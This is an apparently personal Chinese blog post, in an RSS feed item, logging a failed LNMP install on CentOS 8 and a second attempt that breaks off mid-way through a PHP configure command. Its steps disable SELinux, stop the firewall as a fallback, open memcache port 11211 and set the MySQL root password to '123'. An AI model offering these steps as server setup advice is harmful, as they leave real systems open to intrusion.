        <guid>https://proben1.github.io/2022/lnmp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%B1%E8%B4%A5%E7%AF%87/</guid>
        <description>&lt;p&gt;教程:http://c.biancheng.net/linux_tutorial/16/&lt;/p&gt;
&lt;p&gt;任务:配置Linux服务器（lnmp或lamp环境）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LAMP 环境搭建&lt;/strong&gt;指的是在 Linux 操作系统中分别安装 Apache 网页服务器、MySQL 数据库服务器和 PHP 开发服务器，以及一些对应的扩展软件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LNMP 环境搭建&lt;/strong&gt;指的是在 Linux 操作系统中分别安装 Nginx 网页服务器、MySQL 数据库服务器和 PHP 开发服务器，以及一些对应的扩展软件。&lt;/p&gt;
&lt;p&gt;打算安装LNMP的环境.&lt;/p&gt;
&lt;p&gt;系统:Centos-8&lt;/p&gt;
&lt;p&gt;手工安装LAMP需要19个源码包,安装LNMP 环境，那么同样需要安装大概 14 个源码包.
但是现在网上非常流行的 LNMP 环境的搭建过程是采用 LNMP 一键安装包直接安装。
既然是一键安装包，所以我们就不用去下载单个的源码包了，只要在 &lt;a class=&#34;link&#34; href=&#34;http://soft.vpser.net/lnmp/lnmp1.0-full.tar.gz&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://soft.vpser.net/lnmp/lnmp1.0-full.tar.gz&lt;/a&gt; 这个地址中下载 LNMP 一键安装包即可。&lt;/p&gt;
&lt;p&gt;我们应该把软件放置在 Linux 服务器的什么位置呢？
Linux 中的 /usr/local/src/ 目录是系统默认的放置下载软件源代码的位置
所以我们就把搭建 LNMP 环境所需的所有软件包都传递到这个位置&lt;/p&gt;
&lt;h3 id=&#34;winscp传输软件&#34;&gt;WinSCP传输软件&lt;/h3&gt;
&lt;p&gt;WinSCP 是在 Windows 中安装，使用 SFTP 协议向 Linux 服务器传递文件的工具。它的特点是使用简单、图形化操作，而且数据传递过程是加密的，较为安全，是 Windows 和 Linux 之间进行数据传递的常用软件。&lt;/p&gt;
&lt;p&gt;在启动界面的“主机名”文本框中输入 Linux 服务器的 IP 地址，如 192.168.0.210，在“用户名”文本框中输入 Linux 的用户名，在“密码”文本框中输入正确的密码，单击“登录”按钮，就会见到如图 3 所示的界面。&lt;/p&gt;
&lt;p&gt;B计划:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /usr/local/src/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://soft.vpser.net/lnmp/lnmp1.0-full.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mv ~/lnmp1.0-full.tar.gz /usr/local/src/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;yum换源&#34;&gt;yum换源&lt;/h3&gt;
&lt;p&gt;把原本的源移走备份&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir /opt/centos-yum.bak
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mv /etc/yum.repos.d/* /opt/centos-yum.bak/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看系统版本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /etc/redhat-release
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下载aliyun yum源repo文件(对应CentOS-8)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;清除缓存&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum clean all
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum makecache        //把yum源缓存到本地，加快软件的搜索好安装速度
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum list
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;检查硬盘的剩余空间&#34;&gt;检查硬盘的剩余空间&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;df -h&lt;/code&gt;
注意挂载点&amp;quot;&amp;quot;
先留出4G的空间&lt;/p&gt;
&lt;h3 id=&#34;配置防火墙开启80端口3306端口mysql和11211memcache端口&#34;&gt;配置防火墙，开启80端口、3306端口(mysql)和11211（memcache）端口&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;systemctl start firewalld&lt;/code&gt; 开启防火墙
&lt;code&gt;systemctl status firewalld&lt;/code&gt;  查看防火墙状态
&lt;code&gt;firewall-cmd --list-all&lt;/code&gt; 查看开放端口
发现一个都没开hhh
下面来添加端口&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// Step1: 加入开放端口到配置文件
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;# firewall-cmd --zone=public --add-port=80/tcp --permanent&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--zone&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;public 添加时区
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--add-port&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;80/tcp 添加端口
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--permanent 永久生效
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// 加载防火墙新配置文件&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt; 以 root 身份输入以下命令，重新加载防火墙，并不中断用户连接，即不丢失状态信息. &lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;firewall-cmd --reload
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;记得重载后再查看开放的端口&lt;/p&gt;
&lt;h3 id=&#34;关闭selinux安全子系统&#34;&gt;关闭SELinux安全子系统&lt;/h3&gt;
&lt;p&gt;我们还需要关闭 SELinux 安全子系统。因为这个子系统会对我们的安装过程产生影响，所以先关闭它。关闭 SELinux 之后，必须重启 Linux 系统，修改才会生效。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vi /etc/selinux/config
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#把 SELINUX=enforcing改为 SELINUX=disabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shutdown -r now
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;B计划:直接禁用防火墙
&lt;code&gt;systemctl stop firewalld&lt;/code&gt;  关闭防火墙&lt;/p&gt;
&lt;h3 id=&#34;安装gcc&#34;&gt;安装gcc&lt;/h3&gt;
&lt;p&gt;安装 gcc 编译工具。如果没有安装 gcc 编译工具，那么 LNMP 一键安装包会尝试自动 yum 安装，但是要保证 yum 源是可用的。&lt;/p&gt;
&lt;h3 id=&#34;停用-rpm-包安装的-apache-和-mysql&#34;&gt;停用 RPM 包安装的 apache 和 MySQL&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;service httpd stop
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;service mysqld stop
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#停止apache和mysql服务&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chkconfig httpd off
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chkconfig mysqld off
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#关闭apache和mysql的自启动&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;解压&#34;&gt;解压&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;cd&lt;/span&gt; /usr/local/src/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tar -zxvf lnmp1.0-full.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;执行安装脚本安装-lnmp-一键安装包&#34;&gt;执行安装脚本安装 LNMP 一键安装包&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;cd&lt;/span&gt; lnmp1.0-full
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./centos.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;起飞!
回车之后安装就会继续，会看到如下界面：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;==========================================================
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LUMP V1.0 for CentOS/RadHat Linux VPS Written by Licess
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;==========================================================
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;A tool to auto-compile &amp;amp; install Nginx+MySQL+PHP on Linux
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;For more information please visit http://www.lnmp.org/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;==========================================================
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please input the root password of mysql:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(Default password: root) : 123  #设定MySQL 的密码，这里设为 123
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;==========================================================
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you want to install the InnoDB Storage Engine?
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(Default no,if you want please input: y , if not please press the enter button):y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#是否需要安装MySQL InnoDB，如果需要安装则输入y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Install PHP 5.3.17,Please input y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Install PHP 5.2.17,Please input n or press Enter
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(Please input y or n) :y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#选择安装PHP的版本,输入y安装的是5.3.17
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Install MySQL 5.5.27,Please input y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Install MySQL 5.1.60,Please input n or press Enter
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(Please input y or n) :y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;#选择安装MySQL的版本，输入y安装的是5.5.27
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Press any key to start. . .or Press Ctrl+c to cancel #按任意鍵开始安装
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果在安装过程中输入错误，则可以按“Ctrl+Backspace”组合键来进行删除。
如果看到以下界面，则证明安装成功。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;=========================================================
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Manager for LNMP VI.0 , Written by Licess
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;=========================================================
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;LNMP is a tool to auto-compile &amp;amp; install Nginx+MySQL+PHP on Linux
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;This script is a tool to Manage status of lnmp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;For more information please visit http://www.lnmp.org
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Usage: /root/lnmp {start|stop|reload|restart|kill|status}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;=========================================================
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nginx is runing!
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;php-fpm is runing!
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;MySQL running (12489)   [确定]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Active Internet connections (only servers)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Proto Recv-Q Send-Q Local Address   Foreign Address State
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp 0 0 0.0.0.0:53575   0.0.0.0:*   LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp 0 0 0.0.0.0:3306    0.0.0.0:*   LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp 0 0 0.0.0.0:111 0.0.0.0:*   LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp 0 0 0.0.0.0:80  0.0.0.0:*   LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp 0 0 0.0.0.0:22  0.0.0.0:*   LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp 0 0 127.0.0.1:631   0.0.0.0:*   LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp 0 0 127.0.0.1:25    0.0.0.0:*   LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp 0 0 :::57454    :::*    LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp 0 0 :::111  :::*    LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp 0 0 :::22   :::*    LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp 0 0 ::1:631 :::*    LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp 0 0 ::1:25  :::*    LISTEN
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;lnmp一键安装包安装的软件及具体位置&#34;&gt;LNMP一键安装包安装的软件及具体位置&lt;/h3&gt;
&lt;p&gt;既然是一键安装，那么默认安装的软件和软件的安装位置都是事先设定好的，在安装过程中不能更改。具体安装了哪些软件及其位置如表 1 所示。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pic.imgdb.cn/item/60f68dc05132923bf83598ba.png&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/60f68dc05132923bf83598ba.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/60f68dc05132923bf83598ba.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;也就是说，LNMP 一键安装只安装了基本的 Nginx、MySQL、PHP、phpMyAdmin 和 Zend Optimizer。&lt;/p&gt;
&lt;h3 id=&#34;heading&#34;&gt;&amp;hellip;.&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;===================================== Check install ===================================
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Checking...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Error: /usr/local/nginx not found!!!Nginx install failed.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Error: /usr/local/php not found!!!PHP install failed.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Error: /usr/local/mysql not found!!!MySQL install failed.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sorry,Failed to install LNMP!
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please visit http://bbs.vpser.net/forum-25-1.html feedback errors and logs.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;You can download /root/lnmp-install.log from your server,and upload lnmp-install.log to LNMP Forum.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[root@localhost-localdomain]在[/usr/local/src/lnmp1.0-full]笑着说:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;​
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;hr&gt;
&lt;hr&gt;
&lt;p&gt;竟然失败了
重来
这次分来装
教程:https://blog.csdn.net/qq_24447851/article/details/106316944&lt;/p&gt;
&lt;p&gt;先是安装Nginx
&lt;code&gt;yum install -y nginx&lt;/code&gt;
安装nginx后可以访问服务器的ip进行查看
&lt;code&gt;nginx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;创建用户组www&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;groupadd www
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;useradd -g www www
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在php-7.3.18里配置pm的用户组和用户&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./configure --prefix=/usr/local/php \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-fpm \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-fpm-user=www \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-fpm-group=www \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-mysqlnd \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-mysqli=mysqlnd \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-pdo-mysql=mysqlnd \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-mysqlnd-compression-support \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-iconv-dir \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-freetype-dir \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-jpeg-dir \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-png-dir \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-zlib \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-libxml-dir \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-xml \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--disable-rpath \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-bcmath \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-shmop \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-sysvsem \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-inline-optimization \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-curl \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-mbregex \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-mbstring \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-intl \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-mcrypt \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-libmbfl \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--enable-ftp \
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--with-gd \
